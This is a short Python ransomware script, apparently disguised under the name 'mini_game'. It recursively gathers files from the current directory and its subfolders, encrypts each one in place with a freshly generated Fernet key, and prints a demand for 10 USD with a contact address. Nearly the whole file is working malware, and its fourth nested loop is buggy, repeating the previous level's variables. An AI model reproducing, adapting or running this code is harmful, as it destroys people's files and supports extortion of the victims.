import os
from cryptography.fernet import Fernet
from colored import fg

files = []

# first instance
for file in os.listdir():
    
    if file =='mini_game.py' or file=='itemvpsrans.key' or file=='mini_game_open.py' or file=='mini_game.exe' or file=='mini_game_open.exe' or file=='itemvpsranspaths.txt' or file=='itemlistvpsrans.key' or file=='other_code_to_added.txt':
        continue
    
    if os.path.isfile(file):
        files.append(file)

    if os.path.isdir(file):

        # second instance
        for dirfile in os.listdir(file):
            if dirfile =='mini_game.py' or dirfile=='itemvpsrans.key' or dirfile=='mini_game_open.py' or dirfile=='mini_game.exe' or dirfile=='mini_game_open.exe' or dirfile=='itemvpsranspaths.txt' or dirfile=='itemlistvpsrans.key':
                continue
            
            
            filename=f"{file}/{dirfile}"
            if os.path.isfile(filename):
                files.append(filename)
            if os.path.isdir(filename):
                
                # third instance
                for dirfile1 in os.listdir(filename):
                    

                    if dirfile1 =='mini_game.py' or dirfile1=='itemvpsrans.key' or dirfile1=='mini_game_open.py' or dirfile1=='mini_game.exe' or dirfile1=='mini_game_open.exe' or dirfile1=='itemvpsranspaths.txt' or dirfile1=='itemlistvpsrans.key':
                        continue
                    filename1=f"{filename}/{dirfile1}"
                    if os.path.isfile(filename1):
                        files.append(filename1)

                    if os.path.isdir(filename1):

                        # fourth instance
                        for dirfile2 in os.listdir(filename):
                            

                            if dirfile1 =='mini_game.py' or dirfile1=='itemvpsrans.key' or dirfile1=='mini_game_open.py' or dirfile1=='mini_game.exe' or dirfile1=='mini_game_open.exe' or dirfile1=='itemvpsranspaths.txt' or dirfile1=='itemlistvpsrans.key':
                                continue
                            filename1=f"{filename}/{dirfile1}"
                            if os.path.isfile(filename1):
                                files.append(filename1)

      
            
if len(files)==0:
    print('No files')

else:
    with open('itemvpsranspaths.txt','w') as text:
        text.write(str(files))

    key = Fernet.generate_key()

    with open('itemvpsrans.key','wb') as thekey:
        thekey.write(key)

    with open('itemlistvpsrans.key','a') as listkey:
        listkey.writelines('\n'+str(key))



    for file in files:
        with open(file,'rb') as thefile:
            contents = thefile.read()
        contents_encrypted=Fernet(key).encrypt(contents)
        with open(file,'wb') as thefile:
            thefile.write(contents_encrypted)
    print(fg('red')+'All of your files have been encrypted.Send me 10 USD or I will delete them.'+fg('red')) 
    print(fg('white')+f'Number of files encrypted : {len(files)}'+fg('white'))
    print(fg('white')+'Contact me via '+fg('white')+fg('cyan')+'vishwapraveen4618@gmail.com'+fg('cyan'))           


end=input(fg('white')+'Press Enter to exit.'+fg('white'))














